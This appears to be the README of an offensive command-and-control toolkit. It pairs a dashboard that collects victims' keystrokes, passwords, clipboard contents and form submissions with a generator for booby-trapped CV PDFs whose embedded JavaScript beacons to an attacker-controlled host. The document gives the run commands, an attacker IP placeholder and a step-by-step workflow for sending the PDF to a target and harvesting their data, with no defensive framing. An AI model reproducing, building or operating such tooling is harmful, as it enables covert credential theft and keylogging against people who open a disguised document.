# phantom-arsenal / C2 Framework v1.0

## Components

### 1. C2 Dashboard Server (`server/server.mjs`)
Real-time web dashboard that receives and displays data from agents.

**Start:**
```bash
node server/server.mjs 7070
```
Then open `http://localhost:7070`

**Receives:**
- `sysinfo` — OS, hostname, username, browser, screen, timezone
- `keystroke` — real-time keylogging
- `password` — captured credentials from forms
- `clipboard` — clipboard content on copy/paste
- `form_submit` — all form data on submit
- `ping` — heartbeat / current URL

### 2. PDF Payload Generator (`payloads/generate_pdf.py`)
Generates a professional-looking CV PDF with embedded JavaScript payload.

**Generate:**
```bash
python3 payloads/generate_pdf.py --c2 http://YOUR_IP:7070 --out victim_cv.pdf
```

**Options:**
- `--c2` — C2 server URL (default: http://127.0.0.1:7070)
- `--cv` — original CV PDF to base on (optional)
- `--out` — output filename
- `--id` — custom agent ID (random if omitted)

## Workflow

```
1. Start C2 server:     node server/server.mjs 7070
2. Generate PDF:        python3 payloads/generate_pdf.py --c2 http://YOUR_IP:7070
3. Send PDF to target
4. Target opens PDF → JS executes → data flows to dashboard
5. Monitor at:          http://YOUR_IP:7070
```

## Data Flow
```
PDF opened by victim
    ↓ JavaScript runs
    ↓ Collects: sysinfo, keystrokes, passwords, clipboard
    ↓ POST /beacon every event
C2 Server receives
    ↓ stores in data/agents.json
    ↓ broadcasts via WebSocket
Dashboard updates in real-time
```
